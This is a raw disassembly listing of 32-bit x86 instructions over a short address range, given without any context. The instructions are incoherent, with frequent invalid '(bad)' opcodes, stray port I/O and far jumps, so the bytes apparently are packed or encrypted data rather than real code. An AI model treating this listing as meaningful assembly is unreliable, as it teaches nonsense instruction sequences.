  41df2b:	lods   al,BYTE PTR ds:[esi]
  41df2c:	fild   DWORD PTR [eax]
  41df2e:	repnz out 0x30,eax
  41df31:	repz pushf 
  41df33:	dec    edx
  41df34:	int3   
  41df35:	adc    al,0xec
  41df37:	mov    al,BYTE PTR [edi-0x4b2e47dc]
  41df3d:	inc    eax
  41df3e:	mov    ds:0xec49a351,al
  41df43:	dec    ebp
  41df44:	jmp    0x41df25
  41df46:	pop    ds
  41df47:	repnz icebp 
  41df49:	jb     0x41df34
  41df4b:	pop    esp
  41df4c:	xor    al,0x96
  41df4e:	jmp    0x529771b2
  41df53:	push   cs
  41df54:	pop    es
  41df55:	arpl   di,bp
  41df57:	shr    BYTE PTR [ecx],1
  41df59:	xchg   esp,eax
  41df5a:	(bad)  
  41df5b:	retf   
  41df5c:	stos   DWORD PTR es:[edi],eax
  41df5d:	pop    ss
  41df5e:	enter  0x2cc9,0xde
  41df62:	adc    al,BYTE PTR [ecx]
  41df64:	ja     0x41dfb0
  41df66:	(bad)  
  41df67:	cmp    BYTE PTR [edx-0x66ea13],ah
  41df6d:	es scas eax,DWORD PTR es:[edi]
  41df6f:	nop
  41df70:	inc    ebp
  41df71:	popf   
  41df72:	inc    edi
  41df73:	add    esi,DWORD PTR [edx]
  41df75:	or     DWORD PTR [edi-0x53d77348],esp
  41df7b:	xchg   edi,eax
  41df7c:	push   ecx
  41df7d:	retf   0x7e2a
  41df80:	mov    dh,0x27
  41df82:	aaa    
  41df83:	cmp    eax,0x6f9bcb01
  41df88:	outs   dx,DWORD PTR ds:[esi]
  41df89:	mov    ds:0x59701b0a,eax
  41df8e:	cld    
  41df8f:	dec    ebp
  41df90:	mul    DWORD PTR [esp+ecx*1]
  41df93:	rep outs dx,BYTE PTR ds:[esi]
  41df95:	cmc    
  41df96:	jmp    0x41dfa1
  41df98:	mov    al,ds:0xbb120da8
  41df9d:	(bad)  
  41df9e:	sub    eax,0xb1adac3
  41dfa3:	inc    edx
  41dfa4:	xchg   esi,eax
  41dfa5:	leave  
  41dfa6:	stos   BYTE PTR es:[edi],al
  41dfa7:	pop    esp
  41dfa8:	or     edx,DWORD PTR ds:0x856c1286
  41dfae:	pop    ecx
  41dfaf:	inc    eax
  41dfb0:	dec    ebx
  41dfb1:	frstor [ebp-0x135c2048]
  41dfb7:	xchg   ebx,eax
  41dfb8:	int3   
  41dfb9:	into   
  41dfba:	in     eax,dx
  41dfbb:	in     al,dx
  41dfbc:	daa    
  41dfbd:	test   al,0x79
  41dfbf:	dec    esp
  41dfc0:	iret   
  41dfc1:	mov    eax,0x839e4c4d
  41dfc6:	call   0x2f25:0xa9670776
  41dfcd:	fisub  WORD PTR [eax+ebp*4-0x3795785]
  41dfd4:	les    edx,FWORD PTR [esi+esi*2-0x71d43106]
  41dfdb:	test   BYTE PTR [esi+0x7b],bh
  41dfde:	scas   eax,DWORD PTR es:[edi]
  41dfdf:	or     ebp,DWORD PTR ds:0xb6dbbfab
  41dfe5:	out    0xf0,eax
  41dfe7:	and    DWORD PTR [ecx],edx
  41dfe9:	mov    ds:0x6fe947a7,eax
  41dfee:	jecxz  0x41dfe6
  41dff0:	call   0xf778d3b
  41dff5:	lods   eax,DWORD PTR ds:[esi]
  41dff6:	xor    edi,DWORD PTR [edi-0x7c]
  41dff9:	adc    edx,esp
  41dffb:	mov    ebp,0x644c83a0
  41e000:	adc    eax,0xdf1e565f
  41e005:	add    esi,DWORD PTR [esi+edx*1-0x1e]
  41e009:	and    eax,0xe57f822d
  41e00e:	call   0x27f9:0xa6d94b81
  41e015:	sub    eax,0x7124fbbb
  41e01a:	les    ecx,FWORD PTR ds:0x98afe034
  41e020:	(bad)  
  41e021:	rcl    BYTE PTR [eax],1
  41e023:	std    
  41e024:	mov    esp,0x1532a4b2
  41e029:	das    
  41e02a:	dec    BYTE PTR ds:0x6a1c6880
  41e030:	jns    0x41dfd5
  41e032:	bound  ecx,QWORD PTR [esi+ebx*2-0x31]
  41e036:	jl     0x41e047
  41e038:	lods   al,BYTE PTR ds:[esi]
  41e039:	xor    bl,bl
  41e03b:	lds    ecx,FWORD PTR [ebx-0xea27216]
  41e041:	mov    edi,0xfee6d370
  41e046:	shr    ebp,cl
  41e048:	pop    es
  41e049:	xchg   bl,ah
  41e04b:	dec    eax
  41e04c:	and    ecx,edi
  41e04e:	dec    esi
  41e04f:	leave  
  41e050:	int    0x6f
  41e052:	cs inc esi
  41e054:	push   ss
  41e055:	add    BYTE PTR [ebx],ch
  41e057:	arpl   ax,dx
  41e059:	retf   
  41e05a:	sub    ah,BYTE PTR [esi-0x1e]
  41e05d:	sbb    DWORD PTR [ebx],edi
  41e05f:	sti    
  41e060:	and    DWORD PTR [ecx],ebx
  41e062:	mov    cl,0x59
  41e064:	jnp    0x41e08f
  41e066:	dec    BYTE PTR [edx]
  41e068:	jmp    0xbbae3e25
  41e06d:	rcr    ch,cl
  41e06f:	add    DWORD PTR [edx],0x63
  41e072:	sbb    DWORD PTR [edx-0x4c],ebp
  41e075:	mov    ds:0x315dd431,al
  41e07a:	adc    bh,BYTE PTR [eax]
  41e07c:	in     al,0x78
  41e07e:	leave  
  41e07f:	sbb    eax,0xe7e8328e
  41e084:	xchg   ecx,eax
  41e085:	dec    edx
  41e086:	push   edx
  41e087:	inc    esi
  41e088:	push   ebx
  41e089:	adc    DWORD PTR [ecx-0x71],esp
  41e08c:	xor    eax,0xed436ba8
  41e091:	fcomp  DWORD PTR [edx]
  41e093:	outs   dx,BYTE PTR ds:[esi]
  41e094:	nop
  41e095:	leave  
  41e096:	lods   al,BYTE PTR ds:[esi]
  41e097:	xchg   esp,eax
  41e098:	in     al,0xe1
  41e09a:	js     0x41e0a7
  41e09c:	add    BYTE PTR [eax-0x55b5df24],dh
  41e0a2:	(bad)  
  41e0a3:	les    esi,FWORD PTR [eax]
  41e0a5:	push   ebp
  41e0a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0a7:	retf   
  41e0a8:	into   
  41e0a9:	js     0x41e038
  41e0ab:	nop
  41e0ac:	xor    eax,0xf91269e2
  41e0b1:	std    
  41e0b2:	inc    edi
  41e0b3:	dec    ebx
  41e0b4:	mov    esp,0xb78a1c5d
  41e0b9:	add    eax,0x9349c4c6
  41e0be:	into   
  41e0bf:	jns    0x41e054
  41e0c1:	aaa    
  41e0c2:	lods   al,BYTE PTR ds:[esi]
  41e0c3:	adc    al,0xcc
  41e0c5:	(bad)  
  41e0c6:	cli    
  41e0c7:	sbb    eax,0xe5cbfbcf
  41e0cc:	imul   esp,DWORD PTR [ebp-0x70],0xffffff88
  41e0d0:	int3   
  41e0d1:	call   0xe2b7:0x11e57f63
  41e0d8:	mov    ch,0x20
  41e0da:	cmp    al,0xd
  41e0dc:	dec    ebx
  41e0de:	out    0xf,eax
  41e0e0:	pop    ds
  41e0e1:	std    
  41e0e2:	fist   DWORD PTR [edi-0x77]
  41e0e5:	dec    esp
  41e0e6:	ins    DWORD PTR es:[edi],dx
  41e0e7:	test   DWORD PTR [edx-0x4],0x5cea9986
  41e0ee:	and    dl,al
  41e0f0:	jg     0x41e12b
  41e0f2:	aas    
  41e0f3:	push   ebp
  41e0f4:	fisub  WORD PTR [eax+0x3a]
  41e0f7:	mov    cl,BYTE PTR [edi-0x4b]
  41e0fa:	adc    DWORD PTR [ebx+0x4d168476],0x6e73a57b
  41e104:	pop    ecx
  41e106:	ror    DWORD PTR [ebx+0x62],cl
  41e109:	or     DWORD PTR [ebp+0x72f24b3c],ebx
  41e10f:	sub    al,0x4b
  41e111:	adc    eax,DWORD PTR [esi-0x8888bc3]
  41e117:	sti    
  41e118:	xor    DWORD PTR ds:0xdddafef9,ebx
  41e11e:	ds cld 
  41e120:	inc    esp
  41e121:	xor    ebp,DWORD PTR [eax+0x58]
  41e124:	jp     0x41e15a
  41e126:	dec    ecx
  41e127:	jp     0x41e0b2
  41e129:	add    eax,0x1f7ff223
  41e12e:	pop    esi
  41e12f:	imul   edi,DWORD PTR [ebp-0x68f10e7c],0x1b
  41e136:	and    BYTE PTR [edx+eax*8-0x40eee15d],ch
  41e13d:	xor    eax,0x54dfee26
  41e142:	call   0xd758:0xeaf63490
  41e149:	adc    eax,0x318421d1
  41e14e:	xchg   edx,eax
  41e14f:	xchg   ecx,eax
  41e150:	cdq    
  41e151:	out    dx,eax
  41e152:	sub    cl,0x81
  41e155:	shl    BYTE PTR [ebx+0x11b66051],cl
  41e15b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e15c:	sub    esi,ecx
  41e15e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e15f:	pop    eax
  41e160:	and    BYTE PTR [eax],dl
  41e162:	sti    
  41e163:	xor    BYTE PTR [esi],0xd2
  41e166:	mov    ecx,0x8177d8f5
  41e16b:	cmp    ch,BYTE PTR [edi-0x7df47a21]
  41e171:	xchg   ebp,eax
  41e172:	nop
  41e173:	pop    ecx
  41e174:	mov    esp,0xbdde45cf
  41e179:	icebp  
  41e17a:	xchg   ecx,eax
  41e17b:	sbb    dh,0xd2
  41e17e:	cld    
  41e17f:	retf   0xbfe6
  41e182:	mov    BYTE PTR [esi-0x2b],ah
  41e185:	in     al,dx
  41e186:	xor    eax,0x796ef3ae
  41e18b:	inc    edx
  41e18c:	scas   eax,DWORD PTR es:[edi]
  41e18d:	add    BYTE PTR [esi+0x78f0d353],al
  41e193:	stc    
  41e194:	hlt    
  41e195:	daa    
  41e196:	sub    al,0xb7
  41e198:	lods   al,BYTE PTR ds:[esi]
  41e199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e19a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e19b:	in     eax,dx
  41e19c:	cmp    dh,BYTE PTR [edx]
  41e19e:	inc    ebx
  41e19f:	mov    ah,0x39
  41e1a1:	inc    esp
  41e1a2:	call   DWORD PTR [ebx-0x30]
  41e1a5:	sahf   
  41e1a6:	out    dx,al
  41e1a7:	jge    0x41e1f9
  41e1a9:	sbb    ecx,edx
  41e1ab:	aad    0x95
  41e1ad:	sbb    ah,BYTE PTR [ebp-0x67708854]
  41e1b3:	retf   0x1e01
  41e1b6:	and    eax,0x6564a80a
  41e1bb:	daa    
  41e1bc:	or     bh,BYTE PTR [eax+0x6974f920]
  41e1c2:	(bad)  
  41e1c3:	mov    bh,0xd5
  41e1c5:	jmp    DWORD PTR [esi]
  41e1c7:	bound  esp,QWORD PTR [esi+0x337e7b76]
  41e1cd:	aam    0xe9
  41e1cf:	pop    esp
  41e1d0:	mul    BYTE PTR [ecx]
  41e1d2:	mov    al,0x53
  41e1d4:	test   DWORD PTR [ebp-0x5610bdf7],edi
  41e1da:	div    DWORD PTR [edx]
  41e1dc:	jmp    0x41e23d
  41e1de:	jp     0x41e1d1
  41e1e0:	jge    0x41e1ca
  41e1e2:	cld    
  41e1e3:	ret    
  41e1e4:	sub    BYTE PTR [edi+0x574d2057],bh
  41e1ea:	xor    DWORD PTR [edx+esi*1+0x11],ebp
  41e1ee:	sub    al,0xf
  41e1f0:	(bad)  
  41e1f1:	cmp    DWORD PTR [edi+0x4cccce18],edx
  41e1f7:	mov    dh,0xc
  41e1f9:	mov    al,ds:0xbda90cbd
  41e1fe:	inc    ecx
  41e1ff:	sub    BYTE PTR [eax-0x6e9341e],dh
  41e205:	and    eax,0x63361999
  41e20a:	lock sti 
  41e20c:	je     0x41e1d5
  41e20e:	mov    al,ds:0x6e7353fa
  41e213:	cmp    ah,BYTE PTR [edx+0x65]
  41e216:	xchg   ebp,eax
  41e217:	mov    cl,bh
  41e219:	inc    ecx
  41e21a:	dec    eax
  41e21b:	inc    esp
  41e21c:	sbb    eax,0x58a67bd8
  41e221:	shl    eax,1
  41e223:	mov    al,ds:0x228586a1
  41e228:	daa    
  41e229:	pop    eax
  41e22a:	std    
  41e22b:	ror    ch,cl
  41e22d:	(bad)  [ebx-0x3ba8cd7a]
  41e233:	popa   
  41e234:	pusha  
  41e235:	inc    edi
  41e236:	outs   dx,DWORD PTR ds:[esi]
  41e237:	jbe    0x41e1db
  41e239:	test   eax,0xe69df3ec
  41e23e:	js     0x41e261
  41e240:	inc    ebp
  41e241:	es cmp al,0x7d
  41e244:	xor    DWORD PTR [esi+0x70c0335b],0x21
  41e24b:	push   0x1fb7759d
  41e250:	hlt    
  41e251:	test   ch,0xc
  41e254:	pop    ebp
  41e255:	mov    edx,0xc5eb2348
  41e25a:	leave  
  41e25b:	mov    dh,0x62
  41e25d:	(bad)  
  41e25e:	test   ebp,0x2eeed4d5
  41e264:	dec    ebp
  41e265:	add    ah,cl
  41e267:	pop    ecx
  41e268:	mov    ecx,0x1d19b6ea
  41e26d:	popa   
  41e26e:	cli    
  41e26f:	jmp    0x4534:0x65ddfaf5
  41e276:	jne    0x41e277
  41e278:	in     al,0x65
  41e27a:	popf   
  41e27b:	mov    ch,0x1b
  41e27d:	(bad)  
  41e27e:	mov    bh,0xe0
  41e280:	cwde   
  41e281:	call   0x60ff01a
  41e286:	mov    eax,DWORD PTR [esi]
  41e288:	stos   DWORD PTR es:[edi],eax
  41e289:	nop
  41e28a:	pop    esp
  41e28b:	fcmovbe st,st(7)
  41e28d:	inc    esi
  41e28e:	mul    BYTE PTR [ecx]
  41e290:	stos   BYTE PTR es:[edi],al
  41e291:	pop    ss
  41e292:	and    bl,BYTE PTR ds:0xf9023fee
  41e298:	dec    ebp
  41e299:	je     0x41e2a9
  41e29b:	retf   0x795e
  41e29e:	push   ebp
  41e29f:	jl     0x41e2ef
  41e2a1:	mov    eax,ds:0x18059db4
  41e2a6:	movsx  esi,bl
  41e2a9:	adc    BYTE PTR [ebx+0x62fdede6],ch
  41e2af:	shl    BYTE PTR [ecx-0x4aca9f33],cl
  41e2b5:	js     0x41e333
  41e2b7:	push   esi
  41e2b9:	fwait
  41e2ba:	aas    
  41e2bb:	stc    
  41e2bc:	dec    edx
  41e2bd:	mov    ds:0x5097851c,eax
  41e2c2:	jg     0x41e300
  41e2c4:	(bad)  
  41e2c5:	cmp    DWORD PTR [edx-0x68],ecx
  41e2c8:	dec    edx
  41e2c9:	clc    
  41e2ca:	add    bh,ah
  41e2cc:	xchg   ecx,eax
  41e2cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2ce:	ret    
  41e2cf:	xchg   ecx,eax
  41e2d0:	jge    0x41e33d
  41e2d2:	btc    ebp,esp
  41e2d5:	ins    BYTE PTR es:[edi],dx
  41e2d6:	stos   DWORD PTR es:[edi],eax
  41e2d7:	jge    0x41e2a2
  41e2d9:	xchg   eax,eax
  41e2db:	sub    DWORD PTR [ebp+0x3168c849],esi
  41e2e1:	or     eax,0xc49ec937
  41e2e6:	inc    ecx
  41e2e7:	(bad)  
  41e2e8:	push   esi
  41e2e9:	sti    
  41e2ea:	or     ebx,edx
  41e2ec:	adc    edx,ebx
  41e2ee:	jne    0x41e2e2
  41e2f0:	jge    0x41e2fb
  41e2f2:	inc    ebp
  41e2f3:	mov    ecx,0x97740471
  41e2f8:	mov    ecx,0x3faa993
  41e2fd:	xor    BYTE PTR [edi+0xcec4c7f],cl
  41e303:	push   ss
  41e304:	inc    ebp
  41e305:	adc    BYTE PTR [edx+0x61],0x62
  41e309:	jg     0x41e32a
  41e30b:	jno    0x41e31b
  41e30d:	leave  
  41e30e:	outs   dx,DWORD PTR ds:[esi]
  41e30f:	std    
  41e310:	cmp    eax,0xdf560302
  41e315:	daa    
  41e316:	adc    BYTE PTR [ebp-0x3540348e],dh
  41e31c:	mov    ebx,0xbabb8a60
  41e321:	call   0xec00:0xf28aacb9
  41e328:	icebp  
  41e329:	hlt    
  41e32a:	cmp    ecx,eax
  41e32c:	fcmovbe st,st(5)
  41e32e:	pop    ecx
  41e32f:	and    al,0x70
  41e331:	add    esp,eax
  41e333:	dec    DWORD PTR [eax+0x1ffff758]
  41e339:	push   esi
  41e33a:	sub    eax,0xa9f6bcb3
  41e33f:	dec    esp
  41e340:	mov    edx,0x5d224da4
  41e345:	jbe    0x41e305
  41e347:	lea    ebx,[ecx+0x213a42dc]
  41e34d:	in     al,0x96
  41e34f:	sbb    DWORD PTR [ecx+0x43a297eb],ebx
  41e355:	push   ebx
  41e356:	mov    ds:0xa79765f4,al
  41e35b:	int3   
  41e35c:	add    al,0xa0
  41e35e:	fisubr WORD PTR [edi-0x55fe4e63]
  41e364:	mov    ebp,0xe500668d
  41e369:	push   0xffffffe9
  41e36b:	adc    DWORD PTR [edx-0x4078983b],ebx
  41e371:	loopne 0x41e38b
  41e373:	adc    al,0x51
  41e375:	push   ss
  41e376:	(bad)  
  41e377:	dec    esp
  41e378:	mov    cl,dh
  41e37a:	out    dx,al
  41e37b:	outs   dx,DWORD PTR ds:[esi]
  41e37c:	dec    ebp
  41e37d:	xchg   edi,eax
  41e37e:	mov    ds:0x5f7b5cdc,al
  41e383:	nop
  41e384:	loopne 0x41e30a
  41e386:	inc    edi
  41e387:	mov    ds:0x7a965fd5,al
  41e38c:	dec    ecx
  41e38d:	sar    BYTE PTR [ecx+ecx*2],0xe7
  41e391:	mov    ds:0xc041c79d,al
  41e396:	pushf  
  41e397:	cmp    ch,bl
  41e399:	lock lods al,BYTE PTR ds:[esi]
  41e39b:	loope  0x41e402
  41e39d:	sbb    bh,BYTE PTR [edx+0x34431d58]
  41e3a3:	lea    ebx,[ebp-0x1c2a43b9]
  41e3a9:	pop    ds
  41e3aa:	loop   0x41e3bb
  41e3ac:	iret   
  41e3ad:	arpl   WORD PTR [ebx],ax
  41e3af:	xchg   ebx,eax
  41e3b0:	pop    ecx
  41e3b1:	sbb    BYTE PTR [edx],bh
  41e3b3:	fnsave [ebx+esi*4+0x30a90e5c]
  41e3ba:	(bad)  
  41e3bb:	das    
  41e3bc:	ins    DWORD PTR es:[edi],dx
  41e3bd:	mov    ecx,0xf448f988
  41e3c2:	into   
  41e3c3:	cli    
  41e3c4:	push   es
  41e3c5:	clc    
  41e3c6:	mov    edi,DWORD PTR [ebx-0x50411b05]
  41e3cc:	sbb    ch,bl
  41e3ce:	pop    edi
  41e3cf:	and    al,0x60
  41e3d1:	sub    eax,0x8aa9393a
  41e3d6:	sub    bl,bh
  41e3d8:	cdq    
  41e3d9:	and    ch,BYTE PTR [eax+0x2d2cbae]
  41e3df:	jmp    0x3151:0x30d2f6ca
  41e3e6:	cwde   
  41e3e7:	adc    DWORD PTR [ecx],ebp
  41e3e9:	loop   0x41e3a2
  41e3eb:	(bad)  
  41e3ec:	mov    BYTE PTR [ecx],ch
  41e3ee:	xor    al,0xe9
  41e3f0:	push   cs
  41e3f1:	imul   edx,DWORD PTR [ecx],0x1d74488c
  41e3f7:	cld    
  41e3f8:	ret    0x1ff4
  41e3fb:	int3   
  41e3fc:	push   es
  41e3fd:	add    DWORD PTR [ebp+0x4e49e3aa],esi
  41e403:	(bad)  
  41e404:	into   
  41e405:	(bad)  
  41e406:	ins    DWORD PTR es:[edi],dx
  41e407:	or     DWORD PTR [ecx],ebx
  41e409:	sbb    eax,0x26d23705
  41e40e:	lods   al,BYTE PTR ds:[esi]
  41e40f:	jle    0x41e480
  41e411:	dec    ebx
  41e412:	fstp   DWORD PTR [ebp+ebx*1-0x59]
  41e416:	pushf  
  41e417:	sar    ebx,0xa
  41e41a:	sbb    bl,bl
  41e41c:	retf   
  41e41d:	cdq    
  41e41e:	(bad)  [ebp-0x3aaa6f34]
  41e424:	aaa    
  41e425:	jno    0x41e410
  41e427:	cmp    al,0x18
  41e429:	outs   dx,BYTE PTR ds:[esi]
  41e42a:	pop    ds
  41e42b:	arpl   bp,sp
  41e42d:	mov    cl,BYTE PTR [ebp*2-0x6da95863]
  41e434:	hlt    
  41e435:	add    esi,DWORD PTR [edx+0xf870100]
  41e43b:	cmp    DWORD PTR [esi+0x6d47370d],ebx
  41e441:	add    esi,DWORD PTR ds:0xca353991
  41e448:	fild   QWORD PTR [ecx]
  41e44a:	fld    DWORD PTR [ebp-0xfc02f6]
  41e450:	aam    0x72
  41e452:	mov    cl,0xd2
  41e454:	in     eax,0x71
  41e456:	fldenv [ebx-0x54]
  41e459:	in     eax,0x66
  41e45b:	mov    edx,esi
  41e45d:	mov    al,ds:0x40837c78
  41e462:	cmp    cl,BYTE PTR [ebx]
  41e464:	mov    al,BYTE PTR [edi-0x37]
  41e467:	shr    BYTE PTR [edx],0xbd
  41e46a:	jnp    0x41e445
  41e46c:	je     0x41e3f5
  41e46e:	xor    dh,BYTE PTR ds:0x968b35bc
  41e474:	ins    DWORD PTR es:[edi],dx
  41e475:	loopne 0x41e4f0
  41e477:	jmp    0x555d:0xd9255931
  41e47e:	into   
  41e47f:	xor    eax,0x66a4ecf
  41e484:	sub    ebp,ebx
  41e486:	xor    BYTE PTR [edi+eiz*8-0x66],bl
  41e48a:	push   edx
  41e48b:	call   0xe48adfaf
  41e490:	mov    al,0xec
  41e492:	push   eax
  41e493:	outs   dx,DWORD PTR ds:[esi]
  41e494:	fisttp QWORD PTR [eax+0x2bdf7ab8]
  41e49a:	cmp    bh,ah
  41e49c:	push   edx
  41e49d:	in     eax,0xc6
  41e49f:	pop    ebp
  41e4a0:	jo     0x41e457
  41e4a2:	adc    ebx,esi
  41e4a4:	retf   
  41e4a5:	inc    ebp
  41e4a6:	cdq    
  41e4a7:	inc    ebp
  41e4a8:	sbb    DWORD PTR [eax-0x6dffe7c6],edx
  41e4ae:	stos   BYTE PTR es:[edi],al
  41e4af:	dec    esp
  41e4b0:	into   
  41e4b1:	hlt    
  41e4b2:	sub    bl,ah
  41e4b4:	sti    
  41e4b5:	push   0x5c
  41e4b7:	dec    ecx
  41e4b8:	gs iret 
  41e4ba:	dec    ebx
  41e4bb:	out    0xf8,eax
  41e4bd:	adc    DWORD PTR [ecx+0x4f],0x7b88f058
  41e4c4:	jbe    0x41e521
  41e4c6:	sub    DWORD PTR [ebx-0x1c266308],ecx
  41e4cc:	xor    al,0x5c
  41e4ce:	and    al,0x29
  41e4d0:	mov    cl,0xcb
  41e4d2:	cwde   
  41e4d3:	mov    esi,0x487876ae
  41e4d8:	jl     0x41e496
  41e4da:	cli    
  41e4db:	cli    
  41e4dc:	xchg   esp,eax
  41e4dd:	ret    0x31af
  41e4e0:	mov    edx,0xe0a48e80
  41e4e5:	pusha  
  41e4e6:	adc    BYTE PTR [ecx],ch
  41e4e8:	std    
  41e4e9:	daa    
  41e4ea:	retf   0xf330
  41e4ed:	gs jbe 0x41e549
  41e4f0:	int3   
  41e4f1:	int3   
  41e4f2:	pop    es
  41e4f3:	inc    esp
  41e4f4:	adc    eax,0xedb864d5
  41e4f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4fa:	xchg   edx,eax
  41e4fb:	and    DWORD PTR [esi-0x77],0x7b
  41e4ff:	sbb    eax,0xa05167fd
  41e504:	push   cs
  41e505:	fwait
  41e506:	sbb    dl,ch
  41e508:	test   BYTE PTR [eax+0x7d87f1ec],0xd0
  41e50f:	ret    
  41e510:	mov    eax,0xf2a6b07f
  41e515:	xor    ebx,ecx
  41e517:	or     edx,DWORD PTR [ebp+0x7f]
  41e51a:	pusha  
  41e51b:	mov    eax,ds:0x68fc86a9
  41e520:	mov    edx,0x788b5a6c
  41e525:	sub    edi,DWORD PTR [edx+0x6a]
  41e528:	lds    esp,FWORD PTR [edi]
  41e52a:	push   cs
  41e52b:	dec    edx
  41e52c:	adc    al,0xc7
  41e52e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e52f:	jns    0x41e508
  41e531:	(bad)  
  41e532:	mov    edi,ecx
  41e534:	pop    edx
  41e535:	pop    ds
  41e536:	scas   eax,DWORD PTR es:[edi]
  41e537:	ss aam 0x14
  41e53a:	std    
  41e53b:	mov    ah,0xf9
  41e53d:	sbb    al,0x4b
  41e53f:	call   0x90d3ceb7
  41e544:	sub    BYTE PTR [eax+0x35],cl
  41e547:	stc    
  41e548:	push   0xb8d26a6b
  41e54d:	int    0x96
  41e54f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e550:	sub    bh,dh
  41e552:	mov    bh,0x54
  41e554:	dec    ebx
  41e555:	repz int3 
  41e557:	or     ebx,DWORD PTR [ecx+eiz*4-0x35]
  41e55b:	jmp    0x41e522
  41e55d:	pop    es
  41e55e:	(bad)  
  41e55f:	mov    ecx,0x274a437
  41e564:	sub    ebx,DWORD PTR [ecx]
  41e566:	or     BYTE PTR [esi],al
  41e568:	mov    cl,0x9d
  41e56a:	std    
  41e56b:	dec    eax
  41e56c:	(bad)  
  41e56d:	jno    0x41e51c
  41e56f:	xor    BYTE PTR [esi+edi*8+0x33d54aa2],bh
  41e576:	imul   ebp,DWORD PTR [edi+0x306996ad],0x7a
  41e57d:	jle    0x41e5d6
  41e57f:	push   0xa5f76d
  41e584:	ja     0x41e56d
  41e586:	mov    al,ds:0x5aa50a4a
  41e58b:	or     ebp,DWORD PTR [edi+eiz*4-0x50bfae06]
  41e592:	cmc    
  41e593:	mov    edx,0x4da8f161
  41e598:	ficom  WORD PTR [esi-0x11]
  41e59b:	xchg   ebp,eax
  41e59c:	out    0xf,al
  41e59e:	(bad)  
  41e59f:	cmp    DWORD PTR [esi+0xb5910f],edi
  41e5a5:	push   esp
  41e5a6:	sar    DWORD PTR [ebp-0x1f1e520d],0x5d
  41e5ad:	add    cl,BYTE PTR [edx+0x37]
  41e5b0:	js     0x41e57f
  41e5b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5b3:	es or  eax,0x10217846
  41e5b9:	test   eax,0x72a91442
  41e5be:	or     DWORD PTR [esp+ebp*8-0x64],eax
  41e5c2:	mov    al,0xa7
  41e5c4:	aam    0x70
  41e5c6:	js     0x41e592
  41e5c8:	add    esp,ecx
  41e5ca:	xchg   ecx,eax
  41e5cb:	icebp  
  41e5cc:	sub    al,0xd9
  41e5ce:	add    ebp,0x4e9a2fde
  41e5d4:	mov    ah,0xd
  41e5d6:	sbb    dl,ah
  41e5d8:	mov    ds:0x48e3f156,al
  41e5dd:	and    eax,0xd62b9947
  41e5e2:	mov    bl,0xe8
  41e5e4:	push   esi
  41e5e5:	lahf   
  41e5e6:	rol    ebx,cl
  41e5e8:	das    
  41e5e9:	ficomp WORD PTR [ebx]
  41e5eb:	mov    edx,0xe17c0b
  41e5f0:	pop    ds
  41e5f1:	iret   
  41e5f2:	adc    ah,0x2a
  41e5f5:	xchg   ebp,eax
  41e5f6:	and    al,0x6c
  41e5f8:	into   
  41e5f9:	mov    edi,?
  41e5fb:	pop    edi
  41e5fc:	ror    DWORD PTR cs:[eax+eax*1+0x37ebb63a],1
  41e604:	push   cs
  41e605:	cmp    eax,0x12f0ce6
  41e60a:	loop   0x41e59e
  41e60c:	and    eax,0x6afe3e3d
  41e611:	cmp    DWORD PTR [esi+0x1eda49b],ebx
  41e617:	pop    ebx
  41e618:	ret    0xd8ad
  41e61b:	test   DWORD PTR [ecx],esi
  41e61d:	ins    DWORD PTR es:[edi],dx
  41e61e:	or     DWORD PTR [esi],edi
  41e620:	aad    0x7e
  41e622:	test   edi,eax
  41e624:	popa   
  41e625:	(bad)
  41e628:	stos   BYTE PTR es:[edi],al
  41e629:	repnz test eax,0xd4c8f9b3
  41e62f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e630:	addr16 and al,0x3e
  41e633:	cwde   
  41e634:	popf   
  41e635:	shld   DWORD PTR [ebx-0x1d7f2658],esp,0x71
  41e63d:	adc    ch,BYTE PTR [edi+edx*1-0x747eb9a7]
  41e644:	je     0x41e69c
  41e646:	xor    eax,0x3692462c
  41e64b:	fstp   TBYTE PTR [eax+0x27]
  41e64e:	mov    ebx,0xd5b16d8f
  41e653:	cmp    eax,0xb1e7004
  41e658:	dec    esi
  41e659:	call   0x81ff:0x2caeab7c
  41e660:	pop    esp
  41e661:	pop    ss
  41e662:	loop   0x41e6b4
  41e664:	mov    eax,0xed0918f8
  41e669:	fistp  QWORD PTR [esi+0x8]
  41e66c:	jo     0x41e6bd
  41e66e:	add    eax,0xe9c75979
  41e673:	lods   eax,DWORD PTR ds:[esi]
  41e674:	add    esp,DWORD PTR [edx]
  41e676:	sub    al,0x53
  41e678:	sub    bl,BYTE PTR [ebx+0x5ce27a18]
  41e67e:	cli    
  41e67f:	imul   edx,DWORD PTR [ecx+ecx*2-0x5f],0x57ab205
  41e687:	mov    gs,esi
  41e689:	xchg   edx,eax
  41e68a:	jecxz  0x41e62a
  41e68c:	dec    ecx
  41e68d:	mov    ebp,0x99f930b
  41e692:	mov    DWORD PTR [ebx+ecx*2+0x35],edi
  41e696:	jmp    0x41e661
  41e698:	test   DWORD PTR [esi-0x588e2f37],ebx
  41e69e:	gs icebp 
  41e6a0:	inc    ebx
  41e6a1:	xor    ecx,DWORD PTR [edx-0x33]
  41e6a4:	push   eax
  41e6a5:	mov    DWORD PTR [edx],0xcb1ddb09
  41e6ab:	ds addr16 mov ecx,0xa70afbaa
  41e6b2:	out    dx,eax
  41e6b3:	loopne 0x41e650
  41e6b5:	jmp    0x41e6ac
  41e6b7:	xlat   BYTE PTR ds:[ebx]
  41e6b8:	pop    ebp
  41e6b9:	inc    ebx
  41e6ba:	and    eax,DWORD PTR [ecx+0x4d91c3a9]
  41e6c0:	fld    QWORD PTR [ebx]
  41e6c2:	mov    eax,0xdcd74194
  41e6c7:	and    al,0x34
  41e6c9:	stos   DWORD PTR es:[edi],eax
  41e6ca:	and    al,0xe2
  41e6cc:	jle    0x41e660
  41e6ce:	mov    BYTE PTR [ecx-0x29],ah
  41e6d1:	push   0x332ec131
  41e6d6:	cmp    edx,DWORD PTR [eax+edx*2+0x79c49951]
  41e6dd:	out    dx,al
